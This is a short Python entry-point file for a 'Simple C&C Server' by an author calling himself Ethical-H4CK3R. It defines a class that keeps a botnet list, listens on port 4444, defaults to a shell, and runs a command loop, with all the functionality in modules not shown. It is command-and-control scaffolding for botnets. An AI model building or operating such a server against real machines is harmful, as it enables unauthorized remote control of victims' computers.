# Date: 09/28/2017
# Author: Ethical-H4CK3R
# Description: A Simple C&C Server

from core.prompt import Prompt
from core.server import Server
from template.design import Designer
from core.console import MainController
from core.communicate import Communicate

__version__ = 0.1

class Flex(Prompt, Server, Designer, MainController, Communicate):
 ''' A Simple C&C Server '''
 
 def __init__(self):
  self.ip = '127.0.0.1'
  self.port = 4444
  self.botnet = []
     
  Prompt.__init__(self)
  Server.__init__(self)
  Designer.__init__(self)
  Communicate.__init__(self)
  MainController.__init__(self)
  
  self.wait = False
  self.ping = False
  self.alive = True
  self.debug = True
  self.activeIP = None
  self.activePort = None
  self.default_to_shell = True
  self.prompt = self.getprompt()
 
 def start(self):
  try:self.cmdloop()
  finally:self.disconnect(True)
   
if __name__ == '__main__':
 Flex().start()
